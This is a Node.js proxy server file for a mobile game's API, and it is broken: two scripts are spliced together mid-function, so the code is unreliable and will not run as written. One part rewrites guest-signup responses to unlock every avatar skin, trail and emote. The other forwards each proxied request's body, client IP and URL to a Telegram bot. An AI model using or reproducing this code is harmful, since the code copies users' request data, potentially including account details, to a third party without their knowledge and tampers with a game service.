import express from "express";
import fetch from "node-fetch";
// server.js
// Simple proxy to https://mod.jall.my.id/api/v11/*
// Forwards request body to Telegram (bot token + chat id required)

require('dotenv').config();
const express = require('express');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Replace with your full dump values
const customData = {
  owned: {
    "profile.avatar": [
{ id: "char_droid_01_skin_0000" },
{ id: "char_droid_01_skin_0001" },
{ id: "char_droid_01_skin_0002" },
{ id: "char_droid_02_skin_0000" },
{ id: "char_droid_03_skin_0000" },
{ id: "char_female_01_skin_0004" },
{ id: "char_female_01_skin_0005" },
{ id: "char_female_01_skin_0006" },
{ id: "char_female_01_skin_0007" },
{ id: "char_female_01_skin_0008" },
{ id: "char_female_01_skin_0009" },
{ id: "char_female_01_skin_0010" },
{ id: "char_female_02_skin_0000" },
{ id: "char_female_03_skin_0004" },
{ id: "char_female_03_skin_0005" },
{ id: "char_female_03_skin_0006" },
{ id: "char_female_03_skin_0007" },
{ id: "char_female_03_skin_0008" },
{ id: "char_female_03_skin_0009" },
{ id: "char_female_03_skin_0011" },
{ id: "char_female_03_skin_0012" },
{ id: "char_female_04_skin_0000" },
{ id: "char_female_05_skin_0000" },
{ id: "char_female_06_skin_0000" },
{ id: "char_female_06_skin_0001" },
{ id: "char_female_06_skin_0002" },
{ id: "char_female_07_skin_0000" },
{ id: "char_female_08_skin_0000" },
{ id: "char_male_01_skin_0004" },
{ id: "char_male_01_skin_0005" },
{ id: "char_male_01_skin_0006" },
{ id: "char_male_01_skin_0007" },
{ id: "char_male_01_skin_0008" },
{ id: "char_male_01_skin_0009" },
{ id: "char_male_01_skin_0010" },
{ id: "char_male_01_skin_0011" },
{ id: "char_male_01_skin_0012" },
{ id: "char_male_01_skin_0013" },
{ id: "char_male_02_skin_0000" },
{ id: "char_male_03_skin_0002" },
{ id: "char_male_03_skin_0003" },
{ id: "char_male_03_skin_0004" },
{ id: "char_male_03_skin_0005" },
{ id: "char_male_03_skin_0006" },
{ id: "char_male_03_skin_0007" },
{ id: "char_male_03_skin_0008" },
{ id: "char_male_03_skin_0009" },
{ id: "char_male_04_skin_0000" },
{ id: "char_male_05_skin_0000" },
{ id: "char_male_05_skin_0001" },
{ id: "char_male_06_skin_0000" },
{ id: "char_male_06_skin_0001" },
{ id: "char_male_06_skin_0002" },
{ id: "char_male_06_skin_0003" },
{ id: "char_male_07_skin_0000" },
{ id: "char_male_07_skin_0001" },
{ id: "char_male_07_skin_0002" },
{ id: "char_male_07_skin_0003" },
{ id: "char_male_08_skin_0000" },
{ id: "char_male_08_skin_0001" },
{ id: "char_male_09_skin_0000" },
{ id: "char_male_09_skin_0001" },
{ id: "char_male_09_skin_0002" },
{ id: "char_male_10_skin_0000" },
{ id: "char_male_11_skin_0000" }

    ],
    trails: [
      { id: "trl_0001" }, { id: "trl_0002" }, { id: "trl_0003" },
      { id: "trl_0004" }, { id: "trl_0005" }, { id: "trl_0006" },
      { id: "trl_0007" }, { id: "trl_0008" }, { id: "trl_0009" },
      { id: "trl_0010" } // … add all from your dump
    ],
    emotes: [
      { id: "emt_0001" }, { id: "emt_0002" }, { id: "emt_0003" },
      { id: "emt_0004" }, { id: "emt_0005" }, { id: "emt_0006" },
      { id: "emt_0007" }, { id: "emt_0008" }, { id: "emt_0009" },
      { id: "emt_0010" } // … add all from your dump
    ]

// Raw body for all content types so we can forward binary/text exactly.
// Increase limit if you expect larger payloads.
app.use(express.raw({ type: '*/*', limit: '10mb' }));

// Config via env
const TARGET_BASE = process.env.TARGET_BASE || 'https://mod.jall.my.id/api/v11';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const TELEGRAM_ENABLED = !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);

// Hop-by-hop headers that should not be forwarded back to client
const HOP_BY_HOP = new Set([
  'connection',
  'keep-alive',
  'proxy-authenticate',
  'proxy-authorization',
  'te',
  'trailers',
  'transfer-encoding',
  'upgrade'
]);

function filterRequestHeaders(originalHeaders) {
  const h = { ...originalHeaders };
  delete h.host; // upstream will set host
  // optionally remove other headers you don't want to forward to upstream
  return h;
}

function filterResponseHeaders(upstreamHeaders) {
  const out = {};
  for (const [k, v] of Object.entries(upstreamHeaders || {})) {
    if (HOP_BY_HOP.has(k.toLowerCase())) continue;
    // Some servers return arrays. Axios typically flattens; we set as-is.
    out[k] = v;
}
};
  return out;
}

async function sendToTelegram(req, rawBodyBuffer) {
  if (!TELEGRAM_ENABLED) return { ok: false, reason: 'Telegram not configured' };

  // Prepare metadata text
  const summary = [
    `🔔 <b>Proxied Request</b>`,
    `<b>URL:</b> ${req.originalUrl}`,
    `<b>Method:</b> ${req.method}`,
    `<b>Remote IP:</b> ${req.ip || req.connection?.remoteAddress || 'unknown'}`,
    `<b>Content-Type:</b> ${req.get('content-type') || '(none)'}`
  ].join('\n');

  const contentType = (req.get('content-type') || '').toLowerCase();

app.all("*", async (req, res) => {
try {
    const targetUrl = "https://prod.api.indusgame.com" + req.originalUrl;
    const headers = { ...req.headers };
    delete headers.host;
    // If small and textual, send as a single message with body text (escape HTML)
    if (
      contentType.startsWith('application/json') ||
      contentType.startsWith('text/') ||
      contentType === 'application/x-www-form-urlencoded'
    ) {
      // convert buffer to string safely
      let bodyStr = '';
      try { bodyStr = rawBodyBuffer ? rawBodyBuffer.toString('utf8') : ''; } catch(e){ bodyStr = '[unreadable]'; }

      // Limit message size to Telegram limits (~4096 chars). If bigger, fall through to document send.
      const fullText = `${summary}\n\n<b>Body:</b>\n<pre>${escapeHtml(bodyStr).slice(0, 3800)}</pre>`;
      if (fullText.length < 3800) {
        const resp = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id: TELEGRAM_CHAT_ID,
          text: fullText,
          parse_mode: 'HTML'
        }, { timeout: 10000 });
        return { ok: true, method: 'sendMessage', resp: resp.data };
      }
      // else fallthrough to sendDocument
    }

    const upstreamResponse = await fetch(targetUrl, {
      method: req.method,
    // For binary or large bodies, send as document
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('caption', summary);
    // name file from path
    const filename = (req.path && req.path.replace(/\//g, '_').replace(/^_/, '')) || 'body.bin';
    form.append('document', rawBodyBuffer || Buffer.from(''), { filename: filename, contentType: contentType || 'application/octet-stream' });

    const headers = form.getHeaders();
    const resp = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
headers,
      body: ["GET", "HEAD"].includes(req.method) ? undefined : JSON.stringify(req.body),
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      timeout: 20000
});

    let body = await upstreamResponse.text();
    return { ok: true, method: 'sendDocument', resp: resp.data };
  } catch (err) {
    // Return error info
    return { ok: false, error: err?.toString?.() || String(err), detail: err?.response?.data || null };
  }
}

    // ✅ Modify guest-signups only
    if (req.path.includes("/guest-signups")) {
      try {
        const json = JSON.parse(body);
function escapeHtml(unsafe) {
  if (!unsafe) return '';
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

        if (json.user?.owned) {
          json.user.owned["profile.avatar"] = customData.owned["profile.avatar"];
          json.user.owned["trails"] = customData.owned.trails;
          json.user.owned["emotes"] = customData.owned.emotes;
        }
// Catch-all route to proxy every request path
app.all('*', async (req, res) => {
  try {
    // Build target URL: append the full originalUrl (path + query) to TARGET_BASE
    // If originalUrl already starts with '/', just concatenate
    const targetUrl = `${TARGET_BASE}${req.originalUrl}`;

    // Forward headers (but remove host)
    const forwardHeaders = filterRequestHeaders(req.headers);

    // For GET/HEAD, do not include body
    const method = req.method.toUpperCase();
    const hasBody = !(method === 'GET' || method === 'HEAD' || method === 'OPTIONS' && !req.body);

    const axiosConfig = {
      url: targetUrl,
      method,
      headers: forwardHeaders,
      responseType: 'arraybuffer', // get raw bytes
      validateStatus: () => true, // we'll forward the status code as-is
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      timeout: 45000
    };

    if (hasBody) {
      // req.body is a Buffer (because of express.raw)
      axiosConfig.data = req.body;
    }

    // 1) Send body to Telegram (synchronously so we know it happened)
    // Note: if you prefer not await this before proxying, you could do it async.
    let tgResult = null;
    try {
      tgResult = await sendToTelegram(req, req.body);
    } catch (e) {
      tgResult = { ok: false, error: e.toString() };
    }

    // 2) Proxy request to upstream
    const upstreamResp = await axios.request(axiosConfig);

        body = JSON.stringify(json);
      } catch (err) {
        console.error("Error modifying guest-signups response:", err);
    // 3) Copy upstream status, headers, and body to our response
    const filteredHeaders = filterResponseHeaders(upstreamResp.headers);

    // Set headers on response (avoid duplicate content-length issues)
    for (const [hk, hv] of Object.entries(filteredHeaders)) {
      try {
        res.setHeader(hk, hv);
      } catch (e) {
        // ignore headers that can't be set
}
}

    upstreamResponse.headers.forEach((value, key) => {
      res.setHeader(key, value);
    });
    // Also expose telegram result in a response header for debugging (optional)
    // WARNING: do not expose in production if header may contain sensitive info.
    res.setHeader('X-Proxy-Telegram-Status', tgResult?.ok ? 'sent' : 'failed');

    res.status(upstreamResponse.status).send(body);
  } catch (error) {
    console.error("Proxy error:", error);
    res.status(500).send("Proxy error");
    // Set status code and send body buffer
    res.status(upstreamResp.status).send(Buffer.from(upstreamResp.data || []));
  } catch (err) {
    console.error('Proxy error:', err);
    res.status(502).json({
      error: 'proxy_error',
      message: err?.toString?.() || String(err)
    });
}
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Proxy running on ${PORT}`));
app.listen(PORT, () => {
  console.log(`Proxy server listening on port ${PORT}`);
  console.log(`Forwarding to target base: ${TARGET_BASE}`);
  console.log(`Telegram enabled: ${TELEGRAM_ENABLED}`);
});
